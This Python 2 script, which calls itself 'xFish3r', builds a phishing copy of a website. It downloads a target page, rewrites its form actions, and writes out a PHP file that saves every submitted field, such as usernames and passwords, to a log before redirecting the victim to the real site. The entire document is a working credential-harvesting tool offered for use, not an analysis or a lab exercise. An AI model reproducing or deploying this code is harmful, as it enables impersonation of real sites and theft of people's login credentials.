import urllib2
import os
#Created BY SABER SEBRI
if os.name == 'nt':
	os.system('cls')
	os.system('color a')
else:
	os.system('clear')
class bcolors:
    OKGREEN = '\033[92m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
print bcolors.BOLD+'''

          $$$$$$$$\ $$\           $$\        $$$$$$\            
          $$  _____|\__|          $$ |      $$ ___$$\           
$$\   $$\ $$ |      $$\  $$$$$$$\ $$$$$$$\  \_/   $$ | $$$$$$\  
\$$\ $$  |$$$$$\    $$ |$$  _____|$$  __$$\   $$$$$ / $$  __$$\ 
 \$$$$  / $$  __|   $$ |\$$$$$$\  $$ |  $$ |  \___$$\ $$ |  \__|
 $$  $$<  $$ |      $$ | \____$$\ $$ |  $$ |$$\   $$ |$$ |      
$$  /\$$\ $$ |      $$ |$$$$$$$  |$$ |  $$ |\$$$$$$  |$$ |      
\__/  \__|\__|      \__|\_______/ \__|  \__| \______/ \__|      
                                    Created BY Saber Sebri                            
                                                                
                                                                
          

'''
site = raw_input("Site : ")
login = raw_input("Name of PHP File : ")
log = raw_input("Log File Name : ")
redirect = raw_input("Redirect To : ")
az = '''
<?php
header ('Location: %s ');
$handle = fopen("%s", "a");
foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
}
fwrite($handle, "===============\r\n");
fclose($handle);
fclose($handle);
exit;
?>
'''%(redirect,log)
sour = urllib2.urlopen(site).read()
ar = sour.replace('action=', 'action='+login+'?')
name = site.split('/')[2]
os.mkdir(name, 0755)
with open(name+'/index.html', 'a') as oo:
	oo.write(ar)
with open(name+'/'+login, 'a') as oo:
	oo.write(az)
print "Saved in : "+name
